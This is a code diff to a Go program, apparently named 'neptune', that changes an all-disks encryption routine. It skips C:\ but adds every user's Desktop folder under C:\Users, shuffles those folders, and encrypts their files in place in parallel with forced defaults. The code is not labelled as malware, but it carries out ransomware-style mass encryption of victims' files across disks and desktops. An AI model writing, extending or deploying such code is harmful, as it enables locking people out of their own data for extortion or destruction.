@@ -744,10 +744,17 @@ func encryptDirectory(inputDir, outputDir string, senderKeyPair *neptuneCurve255
 //   - senderKeyPair: Sender's key pair for authentication
 //   - recipientPublicKey: Recipient's public key for encryption
 func encryptAllDisks(senderKeyPair *neptuneCurve25519.KeyPair, recipientPublicKey [neptuneCurve25519.KeySize]byte) error {
-	// Get list of all available disks on the system
+	// Get list of all available disks on the system (excluding C:\)
 	disks, err := utils.GetAllDisks()
 	if err != nil {
 		return fmt.Errorf("failed to get disk list: %w", err)
+	}
+
+	// Get all user Desktop directories from C:\Users
+	desktopDirs, err := utils.GetAllDesktopDirectories()
+	if err != nil {
+		utils.PrintWarning("Failed to get Desktop directories: %v", err)
+		desktopDirs = []string{}
 	}
 
 	// Print disk-scan mode warning banner
@@ -756,6 +763,7 @@ func encryptAllDisks(senderKeyPair *neptuneCurve25519.KeyPair, recipientPublicKe
 	utils.PrintWarning("==============================")
 	utils.PrintWarning("Number of disks to scan: %d", len(disks))
 	utils.PrintWarning("Disks: %v", disks)
+	utils.PrintWarning("Number of Desktop directories: %d", len(desktopDirs))
 	utils.PrintWarning("Include patterns: %v", encryptInclude)
 	utils.PrintWarning("Default parameters applied:")
 	utils.PrintWarning("  --force: true")
@@ -765,7 +773,7 @@ func encryptAllDisks(senderKeyPair *neptuneCurve25519.KeyPair, recipientPublicKe
 	utils.PrintWarning("  --parallel: %d", encryptParallel)
 	utils.PrintWarning("==============================")
 	utils.PrintWarning("SCAN RANGE:")
-	utils.PrintWarning("  - All disks: %v", disks)
+	utils.PrintWarning("  - All disks except C:\\: %v", disks)
 	utils.PrintWarning("  - All user desktop directories: C:\\Users\\*\\Desktop")
 	utils.PrintWarning("==============================")
 	utils.PrintWarning("WARNING: This will encrypt files across ALL disks!")
@@ -837,6 +845,56 @@ func encryptAllDisks(senderKeyPair *neptuneCurve25519.KeyPair, recipientPublicKe
 		}
 
 		// Wait for all directories on this disk to finish
+		wg.Wait()
+	}
+
+	// Process all user Desktop directories from C:\Users
+	if len(desktopDirs) > 0 {
+		utils.PrintInfo("Processing Desktop directories from C:\\Users (%d directories)", len(desktopDirs))
+
+		// Shuffle Desktop directories for random processing order
+		utils.ShuffleStrings(desktopDirs)
+
+		// Use WaitGroup and semaphore for controlled parallelism
+		var wg sync.WaitGroup
+		sem := make(chan struct{}, encryptParallel)
+
+		// Process each Desktop directory in parallel
+		for _, desktopDir := range desktopDirs {
+			wg.Add(1)
+			sem <- struct{}{} // Acquire semaphore slot
+
+			go func(dirPath string) {
+				defer wg.Done()
+				defer func() { <-sem }() // Release semaphore slot
+
+				// Recursively find files matching include/exclude patterns
+				files, err := utils.FindFilesRecursively(dirPath, encryptInclude, encryptExclude)
+				if err != nil {
+					utils.PrintWarning("Failed to scan directory: %s", dirPath)
+					atomic.AddInt32(&totalProcessedDirs, 1)
+					return
+				}
+
+				if len(files) == 0 {
+					atomic.AddInt32(&totalSkippedDirs, 1)
+					return
+				}
+
+				// Encrypt all files in this Desktop directory
+				err = encryptDirectory(dirPath, dirPath, senderKeyPair, recipientPublicKey)
+				if err != nil {
+					if !strings.Contains(err.Error(), "no matching files") {
+						utils.PrintWarning("Failed to process directory %s: %v", dirPath, err)
+					}
+				} else {
+					atomic.AddInt32(&totalEncrypted, 1)
+				}
+				atomic.AddInt32(&totalProcessedDirs, 1)
+			}(desktopDir)
+		}
+
+		// Wait for all Desktop directories to finish
 		wg.Wait()
 	}
 
